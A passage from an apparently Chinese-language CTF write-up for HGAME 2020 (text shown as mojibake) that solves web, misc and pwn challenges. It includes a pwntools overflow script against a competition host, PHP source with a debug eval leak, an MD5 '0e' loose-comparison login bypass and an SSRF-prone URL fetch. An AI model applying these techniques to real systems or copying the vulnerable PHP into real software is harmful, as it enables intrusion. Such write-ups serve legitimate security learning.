href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>å°†ä»“åº“ä¿¡æ¯è¿˜åŸä¸‹æ¥ï¼Œç„¶ååœ¨æœ‰<code>.git</code>æ–‡ä»¶å¤¹ç›®å½•ç”¨<code>git remote -v</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200125185928.png" style="zoom: 80%;"><p>åœ¨<code>Commits</code>é‡Œçš„ç¬¬äºŒä¸ªæ‰¾åˆ°base64ç¼–ç çš„flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200123175420.png" style="zoom:67%;"><h4 id="æ¥-å¤´-éœ¸-ç‹"><a href="#æ¥-å¤´-éœ¸-ç‹" class="headerlink" title="æ¥ å¤´ éœ¸ ç‹"></a>æ¥ å¤´ éœ¸ ç‹</h4><p>æ‰“å¼€å‘ç°æç¤º<code>You need to come from https://vidar.club/</code>ï¼Œæƒ³åˆ°è®¾ç½®<code>Referer</code>ï¼Œå‘ç°è®¾ç½®å®Œè¿˜è¦è®¾ç½®<code>X-Forwarded-For</code>,<code>User-Agent</code>,è¯·æ±‚æ–¹å¼æ”¹ä¸º<code>POST</code>,<code>If-Unmodified-Since</code>ï¼Œæœ€ç»ˆè¯·æ±‚</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200123175144.png" style="zoom: 67%;"><h4 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h4><p>æ‰“å¼€å‘ç°è·³åˆ°<code>new.php</code>å¹¶æç¤º<code>403 Forbidden</code>ï¼ŒæŠ“åŒ…çœ‹ä¸‹ï¼Œåœ¨è¯·æ±‚æ ¹ç›®å½•æ—¶å‘ç°æç¤º<code>405 Not Allowed</code></p><p>æœäº†æœ405çš„åŸå› ï¼šApacheã€IISã€Nginxç­‰ç»å¤§å¤šæ•°webæœåŠ¡å™¨ï¼Œéƒ½ä¸å…è®¸é™æ€æ–‡ä»¶å“åº”POSTè¯·æ±‚</p><p>è§£å†³ï¼šå°†postè¯·æ±‚æ”¹ä¸ºgetè¯·æ±‚</p><p>è¯•ç€æ”¹ä¸‹è¯·æ±‚æ–¹å¼ï¼Œæ”¹ä¸ºPOSTå‘ç°</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200123180623.png" style="zoom:67%;"><p>æç¤ºè¦ä¸¤ä¸ªæ•°ç›¸åŠ ä¸º10ï¼Œè¯•äº†è¯•å‘ç°GETå’ŒPOSTéƒ½è¦ä¼ å‚ï¼Œè¦æ³¨æ„åŠ å·è¦urlç¼–ç </p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200123191120.png" style="zoom:67%;"><h4 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h4><p>å¾ˆå¡è¿™é¢˜ï¼Œæ‰“å¼€æŠ“ä¸‹æ¸¸æˆä¹‹åçš„åŒ…ï¼Œå‘ç°ä¼ é€’äº†ä¸€ä¸ªå‚æ•°ï¼Œç”¨|åˆ†å‰²ï¼Œå‰é¢çŒœæµ‹æ˜¯åˆ†æ•°ï¼Œåé¢æ˜¯Unixæ—¶é—´æˆ³çš„MD5åŠ å¯†çš„å€¼ï¼Œä¸è¿‡å¥½åƒæ²¡å•¥ç”¨ï¼Œè¿™é‡Œæœ‰ä¸ªç½‘ç«™<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p><p>ç›´æ¥æ”¹å‰é¢çš„æ•°å°±è¡Œ</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200123182849.png" style="zoom:67%;"><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="æ¬¢è¿å‚åŠ HGameï¼"><a href="#æ¬¢è¿å‚åŠ HGameï¼" class="headerlink" title="æ¬¢è¿å‚åŠ HGameï¼"></a>æ¬¢è¿å‚åŠ HGameï¼</h4><p>æ˜¯ä¸€ä¸²å­—ç¬¦<code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code>ï¼Œbase64è§£å¯†å‘ç°æ˜¯æ‘©æ–¯å¯†ç ï¼Œå†è§£å¯†å¾—<code>W3LC0MEnullTOnull2020nullHGAM3</code>ï¼Œå°†nullæ›¿æ¢æˆ<code>_</code>å¹¶åŠ ä¸Šhgame{}å¾—flag</p><h4 id="å£çº¸"><a href="#å£çº¸" class="headerlink" title="å£çº¸"></a>å£çº¸</h4><p>é¢˜ç›®æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œbinwalkåˆ†ç¦»å‡ºå‹ç¼©åŒ…ï¼ŒstringsæŸ¥çœ‹å¯æ˜¾ç¤ºå­—ç¬¦ï¼Œå‘ç°<code>Password is picture ID.</code>ï¼Œè¿™ä¸ªå›¾ç‰‡æ˜¯Pç«™ä¸Šçš„å›¾ç‰‡ï¼Œæœä¸€ä¸‹å›¾ç‰‡åå­—ï¼Œæ‰¾äº†æ‰¾å‘ç°ä¹Ÿä¸å¯¹ï¼Œçˆ†ç ´ä¸€ä¸‹å§ï¼Œå‘ç°idæ˜¯8ä½æ•°å­—</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200123193817.png" style="zoom:50%;"><p>æˆåŠŸçˆ†ç ´å‡ºæ¥ï¼Œè§£å‹å‘ç°æ˜¯Unicodeç¼–ç ï¼Œè§£ç å¾—flag</p><h4 id="å…‹è‹é²ç¥è¯"><a href="#å…‹è‹é²ç¥è¯" class="headerlink" title="å…‹è‹é²ç¥è¯"></a>å…‹è‹é²ç¥è¯</h4><p>è§£å‹é¢˜ç›®ç»™çš„å‹ç¼©åŒ…ï¼Œå‘ç°<code>Bacon.txt</code>å’Œ<code>Novel.zip</code>ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”<code>Novel.zip</code>æœ‰å’Œ<code>Bacon.txt</code>ä¸€æ ·çš„æ–‡ä»¶</p><p>çŒœæµ‹æ˜¯æ˜æ–‡æ”»å‡»ï¼Œæç¤ºç”¨7-zipï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨7-zipå°†<code>Bacon.txt</code>å‹ç¼©ä½œä¸ºæ˜æ–‡</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200125172756.png" style="zoom: 80%;"><p>ç›´æ¥åœæ­¢å°±è¡Œï¼Œè™½ç„¶æ²¡æ‰¾åˆ°å¯†ç ï¼Œä½†å·²æˆåŠŸè§£å‹å‡ºæ¥äº†</p><p>è§£å‹ä¸¤ä¸ªæ–‡ä»¶ï¼Œ<code>Bacon.txt</code>å’Œ<code>The Call of Cthulhu.doc</code>æ‰“å¼€docæ–‡ä»¶å‘ç°è¦å¯†ç ï¼Œtxtæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.</span><br><span class="line"></span><br><span class="line">*Password in capital letters.</span><br></pre></td></tr></table></figure><p>å¤§å°å†™å­—æ¯äº¤å‰ï¼Œæ˜¾ç„¶æ˜¯åŸ¹æ ¹å¯†ç (äº”ä¸ªä¸€ä½ï¼Œå°å†™å­—æ¯è¡¨ç¤ºå¤§å†™å­—æ¯å¾—åŠ å¯†ç»“æœï¼Œåä¹‹ä¹Ÿæˆç«‹)ï¼Œæ›¿æ¢æˆå°å†™å¾—<code>aababababbaaaaaaabbaaabbbabaaaaaabbaaabbaabaaabbababaaaabbabaaabbabbbaaaaba</code></p><p>è§£å¯†å¾—<code>FLAGHIDDENINDOC</code>ï¼Œè¾“å…¥å¯†ç æ‰“å¼€ï¼Œæ˜¾ç¤ºéšè—æ–‡å­—ï¼Œå¾—åˆ°flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200125174521.png" style="zoom:67%;"><h4 id="ç­¾åˆ°é¢˜ProPlus"><a href="#ç­¾åˆ°é¢˜ProPlus" class="headerlink" title="ç­¾åˆ°é¢˜ProPlus"></a>ç­¾åˆ°é¢˜ProPlus</h4><p>æ‰“å¼€å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…<code>OK.zip</code>ï¼Œä¸€ä¸ª<code>password.txt</code></p><p>æ–‡æœ¬æ–‡ä»¶é‡Œè®°å½•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rdjxfwxjfimknâ€‚z,tsâ€‚wntziâ€‚xtjrwmâ€‚xsfjtâ€‚jmâ€‚ywtâ€‚rtntwhfâ€‚fâ€‚yâ€‚â€‚â€‚hâ€‚jnsxfâ€‚qjFjfâ€‚jnbâ€‚â€‚rgâ€‚fiyykwtbsnkmâ€‚tmâ€‚â€‚xaâ€‚jsdwqjfmkjyâ€‚wlviHtqzqsGsffywjjyynfâ€‚yssmâ€‚xfjypnyihjn.</span><br><span class="line"></span><br><span class="line">JRFVJYFZVRUAGMAI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Three fenses first, Five Caesar next. English sentense first,  zip password next.</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ„æ€æ˜¯å…ˆç»è¿‡äº†ä¸‰å±‚æ …æ å¯†ç ï¼Œåç»è¿‡5å±‚å‡¯æ’’å¯†ç ï¼Œè‹±è¯­å¥å­åœ¨å‰ï¼Œå‹ç¼©åŒ…å¯†ç åœ¨å</p><p>æ …æ å¯†ç åœ¨çº¿è§£å¯†ï¼š<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p><p>å‡¯æ’’å¯†ç åœ¨çº¿è§£å¯†ï¼š<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><p>è§£å¯†ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manyâ€‚yearsâ€‚laterâ€‚asâ€‚heâ€‚facedâ€‚theâ€‚firingâ€‚squad,â€‚Colonelâ€‚Aurelianoâ€‚Buendiaâ€‚wasâ€‚toâ€‚rememberâ€‚thatâ€‚distantâ€‚afternoonâ€‚whenâ€‚hisâ€‚fatherâ€‚tookâ€‚himâ€‚toâ€‚discoverâ€‚ice.</span><br><span class="line"></span><br><span class="line">EAVMUBAQHQMVEPDT</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå°±æ˜¯å‹ç¼©åŒ…å¯†ç ï¼Œè§£å¯†ä¹‹åå¾—åˆ°Ook!åŠ å¯†ï¼Œå¯†æ–‡è§£å¯†å¾—base32çš„å¯†æ–‡ï¼Œå»æ‰<code>data:text;base32,</code>ï¼Œå†è§£å¯†å¾—base64çš„å¯†æ–‡</p><p>æœ€åbase64è½¬å›¾ç‰‡ï¼ŒåŠ ä¸Š<code>data:image/png;base64,</code>ï¼Œå¾—äºŒç»´ç ï¼Œæ‰«ç å¾—flag</p><p>Ook!è§£å¯†åœ°å€ï¼š<a href="https://tool.bugku.com/brainfuck/[](https://tool.bugku.com/brainfuck/)">https://tool.bugku.com/brainfuck/[](https://tool.bugku.com/brainfuck/)</a></p><p>base64è½¬å›¾ç‰‡åœ°å€ï¼š<a href="http://tool.chinaz.com/tools/imgtobase">http://tool.chinaz.com/tools/imgtobase</a></p><h4 id="æ¯æ—¥æ¨è"><a href="#æ¯æ—¥æ¨è" class="headerlink" title="æ¯æ—¥æ¨è"></a>æ¯æ—¥æ¨è</h4><p>æ‰“å¼€å‘ç°æ˜¯ä¸ªæµé‡åŒ…ï¼Œå¯¼å‡ºHTTPå¯¹è±¡ï¼Œå‘ç°æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æ–‡ä»¶</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200125171406.png" style="zoom:67%;"><p>å°†å…¶ä¿å­˜ï¼Œbinwalkåˆ†ç¦»å‡ºä¸€ä¸ªåŠ å¯†å¾—å‹ç¼©åŒ…ï¼ŒæŸ¥çœ‹å±æ€§æ—¶å‘ç°</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200125175048.png" style="zoom:67%;"><p>ARCHPRç ´è§£å‡ºå¯†ç ä¸º<code>759371</code>ï¼Œè§£å‹å¾—åˆ°<code>I Love Mondays.mp3</code></p><p>æŸ¥çœ‹é¢‘è°±å›¾å¾—åˆ°flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200125181832.png" style="zoom:67%;"><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>idaåç¼–è¯‘ä»£ç </p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200126125227.png" style="zoom: 80%;"><p><code>s</code>å’Œ<code>v5</code>ç›¸å·®123ï¼Œæ‰€ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">cn=remote(<span class="string">&#x27;47.103.214.163&#x27;</span>,<span class="number">20000</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">123</span>+<span class="string">&#x27;0O0o\0O0&#x27;</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Cosmosçš„åšå®¢åå°"><a href="#Cosmosçš„åšå®¢åå°" class="headerlink" title="Cosmosçš„åšå®¢åå°"></a>Cosmosçš„åšå®¢åå°</h4><p>æ‰“å¼€å‘ç°è·³è½¬åˆ°<code>?action=login.php</code>ï¼Œæƒ³åˆ°äº†æ–‡ä»¶åŒ…å«ï¼Œ<code>php://filter</code>è¯»æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Only for debug</span><br><span class="line">if (DEBUG_MODE)&#123;</span><br><span class="line">    if(isset($_GET[&#39;debug&#39;])) &#123;</span><br><span class="line">        $debug &#x3D; $_GET[&#39;debug&#39;];</span><br><span class="line">        if (!preg_match(&quot;&#x2F;^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$&#x2F;&quot;, $debug)) &#123;</span><br><span class="line">            die(&quot;args error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&quot;var_dump($$debug);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">        if ($admin_password &#x3D;&#x3D; md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; $admin_username)&#123;</span><br><span class="line">            $_SESSION[&#39;username&#39;] &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">            header(&quot;Location: admin.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;title&gt;Cosmosçš„åšå®¢åå°&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;signin.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;sticky-footer.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;form class&#x3D;&quot;form-signin&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;login.php&quot;&gt;</span><br><span class="line">        &lt;h2 class&#x3D;&quot;form-signin-heading&quot;&gt;åå°ç™»é™†&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;ç”¨æˆ·å&quot; required autofocus&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;å¯†ç &quot; required&gt;</span><br><span class="line">        &lt;input class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;footer class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;text-muted&quot;&gt;Created by Annevi&lt;&#x2F;p&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;footer&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç ï¼Œå‘ç°å¯ä»¥ç”¨å¯å˜å˜é‡æŸ¥çœ‹<code>username</code>ï¼Œè€Œ<code>password</code>çš„MD5åˆæ˜¯0eå¼€å¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?debug&#x3D;admin_username&#x2F;&#x2F;è¯»å–ç”¨æˆ·å</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥ç™»é™†äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:username&#x3D;Cosmos!&amp;password&#x3D;QNKCDZO</span><br></pre></td></tr></table></figure><p>å†æŒ‰ä¹‹å‰çš„æ–¹å¼è¯»ä¸‹<code>admin.php</code>æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&#39;Location: index.php&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insert_img() &#123;</span><br><span class="line">    if (isset($_POST[&#39;img_url&#39;])) &#123;</span><br><span class="line">        $img_url &#x3D; @$_POST[&#39;img_url&#39;];</span><br><span class="line">        $url_array &#x3D; parse_url($img_url);</span><br><span class="line">        if (@$url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;timgsa.baidu.com&quot;) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c &#x3D; curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $res &#x3D; curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar &#x3D; base64_encode($res);</span><br><span class="line"></span><br><span class="line">        if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return base64_encode(file_get_contents(&quot;static&#x2F;logo.png&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Cosmos&#39;Blog - åå°ç®¡ç†&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;a href&#x3D;&quot;logout.php&quot;&gt;é€€å‡ºç™»é™†&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&#39;username&#39;];?&gt; &lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;æ’å…¥å›¾ç‰‡&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;p&gt;&lt;label&gt;å›¾ç‰‡url: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;img_url&quot; placeholder&#x3D;&quot;&quot;&gt;&lt;&#x2F;label&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;p&gt;&lt;button type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&gt;æ’å…¥&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;è¯„è®ºç®¡ç†&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;å¾…å¼€å‘..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;&quot;&gt;</span><br><span class="line">                &lt;legend&gt;æ–‡ç« åˆ—è¡¨&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;å¾…å¼€å‘..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;height: 50%&quot;&gt;</span><br><span class="line">            &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">                &lt;img height&#x3D;&#39;200&#39; width&#x3D;&#39;500&#39; src&#x3D;&#39;data:image&#x2F;jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static&#x2F;error.jpg&quot;)); ?&gt;&#39;&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŒ‰ç…§ä¸‹é¢payloadæ„é€ ï¼š</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200126122656.png" style="zoom: 50%;"><p>è§£ç å³å¯å¾—flag</p><h4 id="Cosmosçš„ç•™è¨€æ¿-1"><a href="#Cosmosçš„ç•™è¨€æ¿-1" class="headerlink" 